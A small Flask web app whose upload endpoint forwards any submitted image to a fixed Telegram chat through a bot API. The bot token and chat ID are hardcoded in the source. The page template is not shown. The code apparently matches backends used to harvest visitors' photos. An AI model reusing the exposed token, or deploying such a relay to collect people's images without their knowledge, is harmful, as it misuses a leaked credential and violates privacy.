import os
import requests
from flask import Flask, render_template, request

app = Flask(__name__)

# بيانات البوت الخاصة بك
TOKEN = "8727994954:AAGh4MD_tBvon4A3G2a73KizfR-MMxzrj5s" 
CHAT_ID = "2089017831" 

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' in request.files:
        file = request.files['image']
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        payload = {'chat_id': CHAT_ID}
        files = {'photo': file.read()}
        requests.post(url, data=payload, files=files)
    return "OK"

if __name__ == "__main__":
    app.run()
